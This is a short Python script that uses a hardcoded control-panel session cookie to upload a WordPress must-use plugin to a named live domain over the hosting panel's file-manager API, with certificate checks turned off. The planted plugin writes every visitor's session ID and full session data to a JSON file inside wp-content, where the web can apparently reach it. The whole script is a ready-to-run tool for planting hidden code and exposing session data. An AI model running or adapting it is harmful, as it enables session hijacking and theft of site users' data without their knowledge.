import requests
import urllib3
urllib3.disable_warnings()

cookies = {'session': '4JSQFGWGGQBXS2BZHCGHLXYQJCSGY3IZCD5WHTI'}
url = 'https://server152c.irwebspace.com:2223/CMD_API_FILE_MANAGER'

php_code = """<?php
add_action('init', function() {
    $data = [
        'session_id' => session_id(),
        'session_keys' => array_keys($_SESSION ?? []),
        'session_data' => $_SESSION ?? []
    ];
    file_put_contents(WP_CONTENT_DIR . '/session_contents.json', json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}, 11);
"""

data = {
    'action': 'edit',
    'path': '/domains/hosseinykala.ir/public_html/wp-content/mu-plugins',
    'filename': 'find_session.php',
    'text': php_code
}
requests.post(url, cookies=cookies, data=data, verify=False)
